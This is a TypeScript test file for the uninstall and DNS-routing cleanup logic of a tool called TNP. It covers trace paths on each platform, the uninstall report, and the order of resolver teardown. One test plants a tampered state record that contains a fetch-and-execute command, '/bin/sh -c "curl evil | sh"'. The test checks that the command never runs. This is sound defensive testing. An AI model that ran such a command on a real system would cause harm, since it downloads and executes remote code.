import { describe, expect, test } from 'bun:test';
import {
  applyNativeRouting,
  macResolverFile,
  removeNativeRouting,
  type RoutingDeps,
  routingStatePath,
} from './dns-routing';
import { formatUninstallReport, removeConnectRouting, tnpTraces } from './uninstall';

describe('tnpTraces', () => {
  test('Linux covers config, identity key, log and binary', () => {
    const paths = tnpTraces({
      platform: 'linux',
      homes: ['/home/a'],
      env: {},
      serviceBinary: '/usr/local/bin/tnp',
    }).map((t) => t.path);
    expect(paths).toEqual(
      expect.arrayContaining([
        '/etc/tnp',
        '/var/lib/tnp',
        '/var/log/tnp-resolver.log',
        '/usr/local/bin/tnp',
      ]),
    );
  });

  test('macOS covers the per-user identity key without a recursive delete', () => {
    const traces = tnpTraces({
      platform: 'darwin',
      homes: ['/Users/a'],
      env: {},
      serviceBinary: '/usr/local/bin/tnp',
    });
    const userKey = traces.find((t) => t.path === '/Users/a/Library/Application Support/tnp');
    expect(userKey?.files).toEqual(
      expect.arrayContaining(['identity.key', 'tlds.json', 'dns-routing-connect.json']),
    );
    expect(traces.map((t) => t.path)).toEqual(
      expect.arrayContaining(['/usr/local/etc/tnp', '/Library/Application Support/tnp']),
    );
  });

  test('Windows takes ProgramData and SystemRoot from the registry, never the environment', () => {
    const traces = tnpTraces({
      platform: 'win32',
      homes: [],
      // A forged environment, as an elevated process inherits it from the user.
      env: {
        PROGRAMDATA: 'C:\\Users\\a\\planted',
        SystemRoot: 'C:\\Users\\a\\planted',
        LOCALAPPDATA: 'C:\\Users\\a\\AppData\\Local',
      },
      serviceBinary: 'C:\\Program Files\\TNP\\tnp.exe',
      windowsFolders: { programData: 'C:\\ProgramData', systemRoot: 'C:\\Windows' },
    });
    expect(traces.map((t) => t.path).join('\n')).not.toContain('planted');
    expect(traces.map((t) => t.path)).toContain('C:\\ProgramData\\tnp');
  });

  test('Windows with an unreadable registry leaves the machine-wide traces out', () => {
    const paths = tnpTraces({
      platform: 'win32',
      homes: [],
      env: { PROGRAMDATA: 'C:\\ProgramData', LOCALAPPDATA: 'C:\\Users\\a\\AppData\\Local' },
      serviceBinary: null,
      windowsFolders: null,
    }).map((t) => t.path);
    expect(paths).toEqual(['C:\\Users\\a\\AppData\\Local\\tnp']);
  });

  test('Windows covers ProgramData, LocalAppData and the Program Files copy', () => {
    const traces = tnpTraces({
      platform: 'win32',
      homes: [],
      env: { LOCALAPPDATA: 'C:\\Users\\a\\AppData\\Local' },
      serviceBinary: 'C:\\Program Files\\TNP\\tnp.exe',
      windowsFolders: { programData: 'C:\\ProgramData', systemRoot: 'C:\\Windows' },
    });
    // The environment of an elevated process is the user's: no Windows trace
    // may be a recursive delete of an environment-derived path.
    for (const trace of traces) expect(trace.files?.length).toBeGreaterThan(0);
    const paths = traces.map((t) => t.path);
    expect(paths).toEqual([
      'C:\\ProgramData\\tnp\\dns-rules',
      'C:\\ProgramData\\tnp',
      'C:\\Users\\a\\AppData\\Local\\tnp',
      // The SYSTEM resolver task's own data directory.
      'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\tnp',
      'C:\\Program Files\\TNP',
    ]);
  });

  test("Linux removes the resolver user's state dir file by file", () => {
    const traces = tnpTraces({
      platform: 'linux',
      homes: [],
      env: {},
      serviceBinary: '/usr/local/bin/tnp',
    });
    expect(traces.find((t) => t.path === '/var/lib/tnp-resolver')?.files).toEqual(['tlds.json']);
  });
});

describe('formatUninstallReport', () => {
  const report = {
    done: ['resolver service'],
    remaining: [{ path: '/etc/tnp', what: 'configuration' }],
    failed: [],
    notes: ['journal'],
  };

  test('plain uninstall lists what remains and how to purge it', () => {
    const text = formatUninstallReport(report, false).join('\n');
    expect(text).toContain('/etc/tnp');
    expect(text).toContain('--purge');
    expect(text).not.toContain('journal');
  });

  test('purge prints what TNP could not remove itself', () => {
    expect(formatUninstallReport({ ...report, remaining: [] }, true).join('\n')).toContain(
      'note: journal',
    );
  });
});

describe('removeConnectRouting', () => {
  const INSTALLED = { address: '127.0.0.1', port: 53 };
  const SESSION = { address: '127.0.0.1', port: 5354 };
  const DIRS = {
    current: '/Library/Application Support/tnp',
    legacy: '/Users/me/Library/Application Support/tnp',
  };
  const STATE = routingStatePath(DIRS.current, 'connect');
  const LEGACY = routingStatePath(DIRS.legacy, 'connect');

  function macDeps(): { deps: RoutingDeps; files: Map<string, string> } {
    const files = new Map<string, string>();
    const deps: RoutingDeps = {
      platform: 'darwin',
      run: () => '',
      exists: (path) => files.has(path),
      read: (path) => {
        const content = files.get(path);
        if (content === undefined) throw new Error(`ENOENT ${path}`);
        return content;
      },
      write: (path, content) => void files.set(path, content),
      remove: (path) => void files.delete(path),
      log: () => {},
      warn: () => {},
    };
    return { deps, files };
  }

  // Found on a real Mac (client-platforms.yml): `tnp connect` killed while
  // running over an installed resolver, then `tnp uninstall --purge`.
  test('run before the install teardown, it leaves no /etc/resolver/ox behind', () => {
    const { deps, files } = macDeps();
    const install = applyNativeRouting({ owner: 'install', target: INSTALLED }, deps).state;
    const session = applyNativeRouting({ owner: 'connect', target: SESSION }, deps).state;
    files.set(STATE, JSON.stringify(session));
    expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(SESSION));

    expect(removeConnectRouting(DIRS, deps)).toBe(true);
    expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(INSTALLED));
    expect(files.has(STATE)).toBe(false);
    removeNativeRouting(install, deps);
    expect(files.has('/etc/resolver/ox')).toBe(false);
  });

  test('the other order is what left the file: why uninstall runs it first', () => {
    const { deps, files } = macDeps();
    const install = applyNativeRouting({ owner: 'install', target: INSTALLED }, deps).state;
    const session = applyNativeRouting({ owner: 'connect', target: SESSION }, deps).state;
    files.set(STATE, JSON.stringify(session));

    removeNativeRouting(install, deps);
    removeConnectRouting(DIRS, deps);
    expect(files.get('/etc/resolver/ox')).toBe(macResolverFile(INSTALLED));
  });

  test('a record where 0.5.1 kept it is still torn down, but only as far as TNP could have written', () => {
    const { deps, files } = macDeps();
    const session = applyNativeRouting({ owner: 'connect', target: SESSION }, deps).state;
    files.set('/etc/hosts', '127.0.0.1 localhost\n');
    // What anything running as the user could leave in its own data directory.
    files.set(
      LEGACY,
      JSON.stringify({
        ...session,
        files: [...session.files, '/etc/hosts'],
        written: { ...session.written, '/etc/hosts': '127.0.0.1 localhost\n' },
        backups: { '/etc/resolver/ox': 'nameserver 192.0.2.66\n' },
        down: ['/bin/sh -c "curl evil | sh"'],
      }),
    );
    const ran: string[] = [];
    const tracing = {
      ...deps,
      run: (cmd: string) => {
        ran.push(cmd);
        return '';
      },
    };

    expect(removeConnectRouting(DIRS, tracing)).toBe(true);
    expect(files.has('/etc/resolver/ox')).toBe(false);
    expect(files.get('/etc/hosts')).toBe('127.0.0.1 localhost\n');
    expect(ran).toEqual([]);
    expect(files.has(LEGACY)).toBe(false);
  });

  test('without a recorded session it does nothing', () => {
    const { deps, files } = macDeps();
    expect(removeConnectRouting(DIRS, deps)).toBe(false);
    expect(files.size).toBe(0);
  });
});
